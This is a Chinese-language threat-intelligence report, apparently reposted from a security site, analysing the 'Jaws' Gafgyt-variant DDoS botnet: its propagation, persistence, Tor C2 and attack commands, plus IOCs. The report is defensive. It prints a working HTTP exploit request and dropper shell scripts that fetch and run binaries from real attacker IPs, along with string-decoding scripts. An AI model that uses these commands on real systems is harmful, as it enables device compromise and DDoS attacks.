> 原文链接: https://www.anquanke.com//post/id/233534 


# Gafgyt变种——Jaws僵尸网络的分析报告


                                阅读量   
                                **111118**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01619992a7456365ee.png)](https://p0.ssl.qhimg.com/t01619992a7456365ee.png)



## 背景

2021年2月19日，蜜罐系统捕捉到针对`MVPower model TV-7104HE(EDB_41471)`设备的远程投递样本，经跟踪发现脚本回连下载地址：http://45.145.185.83/jaws.sh，在2月19日、2月23日、2月24日分别更新了样本的版本。短时间内如此快速地更新版本，比较特殊，故对此进行研究。经过分析，我们确定这是一个借鉴了前代Gafgyt家族的部分代码，通过6001端口远程投递传播，针对MVPower设备，主要目的是为DDOS攻击的新型僵尸网络，附带了内存查杀特殊功能。它的字符串利用古典加密算法，加密字符串及命令信息，通过内置TOR 代理节点与`TOR C2`进行通信。

考虑到僵尸网络最开始远程下载是通过jaws.sh传播的，我们就将其命名为 `Jaws`。Jaws样本，内置了DDoS攻击、弱口令扫描、漏洞利用、内存查杀等功能模块。传播功能，主要是通过对80、8080端口的弱口令扫描和利用CVE-2019-19781漏洞来传播自己。最主要的DDoS功能模块，支持UDP_Flood、TCP_Flood、DNS等攻击指令，样本基本流程图如图1所示：

[![](https://p0.ssl.qhimg.com/t0194e9136c80f0d6a3.png)](https://p0.ssl.qhimg.com/t0194e9136c80f0d6a3.png)

图1：Jaws流程图



## 传播

目前Jaws通过6001端口传播，捕获到的payload如下所示，主要功能是从远程主机`45.245.36.128`下载并执行脚本。

```
GET /shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F172.245.36.128%2Fjaws.sh%20-O%20jaws.sh%3Bsh%20.%2Fjaws.sh%3Brm%20-f%20jaws.sh HTTP/1.1\r\nHost: *.*.*.*:6001\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.25.0\r\n\r\n
```

脚本如下所示，主要功能是从远程主机下载执行相关CPU架构的Jaws样本。

```
#!/bin/sh
cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd / ;
#cd $(find / -writable -readable -executable | head -n 1)
curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; chmod 777 AJhkewbfwefWEFarm; ./AJhkewbfwefWEFarm; rm -rf AJhkewbfwefWEFarm
curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; chmod 777 AJhkewbfwefWEFarm5; ./AJhkewbfwefWEFarm5; rm -rf AJhkewbfwefWEFarm5
#curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; chmod 777 AJhkewbfwefWEFarm7; ./AJhkewbfwefWEFarm7; rm -rf AJhkewbfwefWEFarm7
```



## 样本分析：

Jaws 支持的X86、X32、Mips、Arm等架构。根据蜜罐捕获到的时间线，在2月19日、2月23日、2月24日分别更新了样本第一版，第二版，第三版。本文选取第三版X86的样本作为分析对象，UPX脱壳后的样本信息如下：

样本功能比较简单，运行后首先输出`Error during non-blocking operation: EWOULDBLOCK`字符串以迷惑用户；之后随机生成12位字符串重命名进程；接着进行持久化控制，将自己设置为守护进程，并把自己写入开机自启；随后对被感染主机文件进行读取，并持续扫描内存，关闭一些相关进程；接着对TOR 代理节点列表进行初始化，随机和TOR代理建立通信，最终通过代理和TOR C2 进行通信，等待执行C2 下发指令，进行后续操作。

### **解密敏感字符串**

通过IDA可以看到Jaws将敏感的资源信息都加密存储，以防止相关功能和代码被分析和检测。敏感资源解密后，可以得到TOR C2 和 C2相关指令，如图2 所示：

[![](https://p1.ssl.qhimg.com/t01e589ae42aa9332cb.png)](https://p1.ssl.qhimg.com/t01e589ae42aa9332cb.png)

图2 加密字符串

解密脚本如下所示：

```
str="\"?&gt;K!tF&gt;iorZ:ww_uBw3Bw"# str = "|6e"encodes='%q*KC)&amp;F98fsr2to4b3yi_:wB&gt;z=;!k?"EAZ7.D-md&lt;ex5U~h,j|$v6c1ga+p@un'decoded='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. 'str1= []
while (len(str) &gt;v3):
foriinrange(0,0x40):
if (str[v3] ==encodes[i]):
str1=decoded[i]
print(str1,end="")
v3=v3+1
```

解密后字符串包括 `TOR C2 ：wvp3te7pkfczmnnl.onion` 端口号：`29401`，相关DDoS攻击指令：`UDP、HTTP、TLS、DNS`等。

### **进程重命名**

重命名成大小相间的长度为12的进程名，逃避检测。如图3，图4所示：

[![](https://p4.ssl.qhimg.com/t018144543fd32e0869.png)](https://p4.ssl.qhimg.com/t018144543fd32e0869.png)

图3 随机生成进程名

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016f6183e53ac27648.png)

图4 进程名称

### **进程持久化控制**

通过对进程进行`setid`设置，让进程成为僵尸进程，持久运行在后台。通过把文件写入`/etc/rc.loacl`中，实现开机自启动，达到持久化控制的目的。如图5所示：

[![](https://p5.ssl.qhimg.com/t013cbf79b1ea7ec9c9.png)](https://p5.ssl.qhimg.com/t013cbf79b1ea7ec9c9.png)

图5 持久化处理

### **内存扫描**

为了达到只有自己运行的目的，Jaws样本开启一个进程，持续对宿主机内存进行扫描，对内置的硬编码bot字符串进行检测。若扫描出相关进程，则关掉，如图6，图7所示：

[![](https://p2.ssl.qhimg.com/t01f884f8863e27f287.png)](https://p2.ssl.qhimg.com/t01f884f8863e27f287.png)

图6 内存扫描

[![](https://p3.ssl.qhimg.com/t0161daa184320a5331.png)](https://p3.ssl.qhimg.com/t0161daa184320a5331.png)

图7 遍历KnownBots列表

### **TOR C2 通信**

Jaws样本的TOR 代理通信可以分为3步：

#### **1.初始化TOR代理节点。**

Jaws样本内置了TOR 代理节点，在第一版和第二版中，内置了20个，第三版内置了125个TOR 代理节点。先初始化代理节点，其中的代理有部分重复。如图8所示：

[![](https://p0.ssl.qhimg.com/t016d48814b8e467366.png)](https://p0.ssl.qhimg.com/t016d48814b8e467366.png)

图8 初始化Tor代理节点

#### **2. 和TOR C2 建立通信。**

通过随机数对124个节点取余，选择随机代理节点进行尝试连接，并设置`stage`标志位为1，如图9所示：

[![](https://p5.ssl.qhimg.com/t01d2bdcc10c00fa30b.png)](https://p5.ssl.qhimg.com/t01d2bdcc10c00fa30b.png)

图9 随机选择Tor代理节点连接

当代理节点有响应是，进入`stage`循环，向代理节点发送解码后的`TOR C2和Port`信息，其中端口为29401，并设置`tor_state`标志位，如图10所示：

[![](https://p1.ssl.qhimg.com/t0173b607a393ec8596.png)](https://p1.ssl.qhimg.com/t0173b607a393ec8596.png)

图10 发送Tor C2 信息

当代理节点回复正确上线包后，向TOR代理发送 Bot信息，进入`Case3`循环 并等待 `TOR C2` 的 PING 和指令，如图11所示：

[![](https://p1.ssl.qhimg.com/t0118e9931d677e0e8c.png)](https://p1.ssl.qhimg.com/t0118e9931d677e0e8c.png)

图11 接收Tor C2响应包

#### **3.TOR C2 命令**

在与TOR C2建立联系后，采用心跳包保持长连接。等待指令，针对样本支持的命令。如图12，图13，图14所示：
1. HOLD: 连接到IP地址和端口，持续特定时间
1. JUNK: 与HOLD类似，但是会发送随机生成的字符串到IP地址
1. UDP: 用洪泛UDP包的方式攻击设备
1. ACK: 发送ACK信号来破坏网络活动
1. VSE: 用来消耗目标资源的放大攻击
1. TCP: 发送无数的TCP请求
1. OVH: 用来绕过DDOS缓解服务的DDOS攻击
1. STD: 与UDP包洪泛类似
1. HTTP：目标服务器发起大量的HTTP报文，消耗系统资源的URI，造成服务器资源耗尽，无法响应正常请求
1. DNS: 它利用DNS 解析器产生大量指向受害者的流量，使受害者不堪重负
[![](https://p3.ssl.qhimg.com/t0130b53a552ff6369a.png)](https://p3.ssl.qhimg.com/t0130b53a552ff6369a.png)

图12 HTTP_Flood攻击

[![](https://p4.ssl.qhimg.com/t01b63af1b7a1db31a8.png)](https://p4.ssl.qhimg.com/t01b63af1b7a1db31a8.png)

图13 HOLD 攻击

[![](https://p4.ssl.qhimg.com/t018d61a218e2095397.png)](https://p4.ssl.qhimg.com/t018d61a218e2095397.png)

图14 OVH攻击

与此同时，还有用于扩散传播的扫描模块，模块中内置了针对80端口和8080端口的弱口令扫描和CVE-2019-19781漏洞利用模块。具体信息，如图15所示：

[![](https://p3.ssl.qhimg.com/t014d0d44b71afac48c.png)](https://p3.ssl.qhimg.com/t014d0d44b71afac48c.png)

图15 弱口令扫描

#### **关于TOR C2 上线数据包，如图所示：**

**Bot发送上线包：**

[![](https://p0.ssl.qhimg.com/t01df1058681c44bf52.png)](https://p0.ssl.qhimg.com/t01df1058681c44bf52.png)

**Tor 代理回包：**

[![](https://p2.ssl.qhimg.com/t0174cc4252ca435d67.png)](https://p2.ssl.qhimg.com/t0174cc4252ca435d67.png)

**Bot发送Tor C2 信息：**

[![](https://p5.ssl.qhimg.com/t013d7a71ae599e4b99.png)](https://p5.ssl.qhimg.com/t013d7a71ae599e4b99.png)

**Tor 正确代理回包：**

[![](https://p2.ssl.qhimg.com/t01083efa5b2d946d9f.png)](https://p2.ssl.qhimg.com/t01083efa5b2d946d9f.png)

**错误数据包：**

[![](https://p5.ssl.qhimg.com/t0158fb4678ed3d7533.png)](https://p5.ssl.qhimg.com/t0158fb4678ed3d7533.png)

[![](https://p5.ssl.qhimg.com/t01abf776892c73d2e4.png)](https://p5.ssl.qhimg.com/t01abf776892c73d2e4.png)

[![](https://p1.ssl.qhimg.com/t018386bdc722815d4b.png)](https://p1.ssl.qhimg.com/t018386bdc722815d4b.png)

[![](https://p2.ssl.qhimg.com/t012200169da7809175.png)](https://p2.ssl.qhimg.com/t012200169da7809175.png)

**Bot 上报信息：**

[![](https://p5.ssl.qhimg.com/t017c711c23c2b38c2b.png)](https://p5.ssl.qhimg.com/t017c711c23c2b38c2b.png)



## 小结：

Jaws样本分为三个版本迭代，以上分析是针对第三版本的分析。和前两个版本，略有不同。第一版本，代码采用了大量混淆，有代码级别的，和字符串级别的，内置了几十种的加密算法，使得文件代码量达到了2M之多，其中有效的代码只有180K，不排除是为了降低代码相似性的检验。其中的部分功能不完善，比如内存查杀，第一版本时只关闭特定的一个进程，不会对内存进行扫描。在TOR代理节点数量上也有不同，第一版只有20个。第二版本进行了轻量化处理，砍去的冗余代码，使得样本代码体积小了很多。功能方面，第二版也较为完善。除了前文提到了远程主机下载地址，在蜜罐的系统中也发现了其他的下载版本，并且主机地址属于一个网段，说明僵尸网络团伙进行的是大规模的传播。在以上分析的过程中，笔者自己的IP地址曾被远程下载主机ban掉，在Jaws更新版本期间，有多次与远程主机失去联系。说明僵尸网络团伙有一定的警惕性，有一定的防范措施。命令控制采用TOR C2 网络进行分发，加大了追踪的难度。另外，在云端配置相关样本下载路径，这一点策略较为灵活，加大安全研究的难度，更容易清理攻击痕迹。



## 相关IOC：

### Sample MD5：

第一版：75DDB64F32CF8F429707666D1C32462F

        8EDF141C25EBE39278E006DC9E8CF293

第二版：3DF01B9922FAAF18521879148C5E4825

        55E28A786501DB5A39574D866516FAF3

        A4DDCCCC7A10FA98D540D0819E8D1F32

        E348C6F7089E6D40CA68AEBA9731B54B

        9E47CD0D7C36684E79AE59E1AB4A4C40

第三版：CD3B462B35D86FCC26E4C1F50E421ADD  (x86)

        35A7D219B84FDF81E12893597F91EB8B  (arm)

        1305C0DB890A9C4D3AD6ED650B2B0E02  (arm32)

        E9B47F64E743542A5B57591697352F64  (arm32)

        9BF6BE9909E7F97B000877721B5E7C9A  (arm32)

        2F9344FD7C6336D836ADEE90CC59A700  (mips32)

        1EDFB6128DA7088A2E3347977C40AD3D  (x86)

### Down Url

```
http://45.145.185.83/jaws.sh

http://45.144.225.96/jaws.sh    

2021-2-23

#!/bin/sh

cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd / ;

#cd $(find / -writable -readable -executable | head -n 1)

curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm7 -O; busybox curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm7 -O; wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm7 -O AJhkewbfwefWEFarm7; busybox wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm -O AJhkewbfwefWEFarm7; chmod 777 AJhkewbfwefWEFarm7; ./AJhkewbfwefWEFarm7; rm -rf AJhkewbfwefWEFarm7

curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm -O; busybox curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm -O; wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm -O AJhkewbfwefWEFarm5; busybox wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm -O AJhkewbfwefWEFarm5; chmod 777 AJhkewbfwefWEFarm5; ./AJhkewbfwefWEFarm5; rm -rf AJhkewbfwefWEFarm5

curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm5 -O; busybox curl http://45.145.185.83/S1eJ3/lPxdChtp3zarm5 -O; wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm5 -O AJhkewbfwefWEFarm5; busybox wget http://45.145.185.83/S1eJ3/lPxdChtp3zarm5 -O AJhkewbfwefWEFarm5; chmod 777 AJhkewbfwefWEFarm5; ./AJhkewbfwefWEFarm5; rm -rf AJhkewbfwefWEFarm5

2021-2-24

#!/bin/sh

cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /root || cd / ;

#cd $(find / -writable -readable -executable | head -n 1)

curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm -O AJhkewbfwefWEFarm; chmod 777 AJhkewbfwefWEFarm; ./AJhkewbfwefWEFarm; rm -rf AJhkewbfwefWEFarm

curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm5 -O AJhkewbfwefWEFarm5; chmod 777 AJhkewbfwefWEFarm5; ./AJhkewbfwefWEFarm5; rm -rf AJhkewbfwefWEFarm5

#curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; busybox curl http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O; wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; busybox wget http://45.145.185.83/bins/AJhkewbfwefWEFarm7 -O AJhkewbfwefWEFarm7; chmod 777 AJhkewbfwefWEFarm7; ./AJhkewbfwefWEFarm7; rm -rf AJhkewbfwefWEFarm7

2021-2-28

#!/bin/sh

#cd /tmp || cd /home/$USER

#curl http://45.144.225.96/S1eJ3/IObeENwjarmv7l -O; busybox curl http://45.144.225.96/S1eJ3/IObeENwjarmv7l -O; wget http://45.144.225.96/S1eJ3/IObeENwjarmv7l -O IObeENwjarmv7l; busybox wget http://45.144.225.96/S1eJ3/IObeENwjarmv7l -O IObeENwjarmv7l; chmod 777 IObeENwjarmv7l; ./IObeENwjarmv7l; rm -rf IObeENwjarmv7l

#curl http://45.144.225.96/S1eJ3/IObeENwjarm7 -O; busybox curl http://45.144.225.96/S1eJ3/IObeENwjarm7 -O; wget http://45.144.225.96/S1eJ3/IObeENwjarm7 -O IObeENwjarm7; busybox wget http://45.144.225.96/S1eJ3/IObeENwjarm7 -O IObeENwjarm7; chmod 777 IObeENwjarm7; ./IObeENwjarm7; rm -rf IObeENwjarm7

#curl http://45.144.225.96/S1eJ3/IObeENwjarm5 -O; busybox curl http://45.144.225.96/S1eJ3/IObeENwjarm5 -O; wget http://45.144.225.96/S1eJ3/IObeENwjarm5 -O IObeENwjarm5; busybox wget http://45.144.225.96/S1eJ3/IObeENwjarm5 -O IObeENwjarm5; chmod 777 IObeENwjarm5; ./IObeENwjarm5; rm -rf IObeENwjarm5

curl http://45.144.225.96/S1eJ3/IObeENwjarm -O; busybox curl http://45.144.225.96/S1eJ3/IObeENwjarm -O; wget http://45.144.225.96/S1eJ3/IObeENwjarm -O IObeENwjarm; busybox wget http://45.144.225.96/S1eJ3/IObeENwjarm -O IObeENwjarm; chmod 777 IObeENwjarm; ./IObeENwjarm; rm -rf IObeENwjarm
```

### TOR C2

wvp3te7pkfczmnnl.onion：29401

### Proxy Ip

[![](https://p5.ssl.qhimg.com/t013bdaa4267a668354.png)](https://p5.ssl.qhimg.com/t013bdaa4267a668354.png)

### Python解密脚本

```
str = "\"?&gt;K!tF&gt;iorZ:ww_uBw3Bw"

# str = "|6e"

encodes = '%q*KC)&amp;F98fsr2to4b3yi_:wB&gt;z=;!k?"EAZ7.D-md&lt;ex5U~h,j|$v6c1ga+p@un'

decoded = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ. '

str1 = []

while (len(str) &gt; v3):

    for i in range(0,0x40):

        if (str[v3] == encodes[i]):

            str1 = decoded[i]

            print(str1,end="")

    v3 = v3 + 1

    

#Tor proxy ip  script

def tor_add_sock(a, b, c):

    print(str(int(b &amp;0x000000FF))+"."+ str(int(int((b &amp;0x0000FF00))/0x00FF))+"."

    + str(int(int((b &amp;0x00FF0000))/0x00FFFF))+"." + str(int(int((b &amp;0xFF000000))/0x00FFFFFF))+":"

    +str((c &amp; 0x00FF)*0x100 + int(c/0x00FF)))

if __name__=="__main__":

    tor_add_sock(0, 0x61F9D186, 0x901F)

    tor_add_sock(1, 0x7CD2CB74, 0xBF23)

    tor_add_sock(2, 0x7CD2CB74, 0xE723)
```
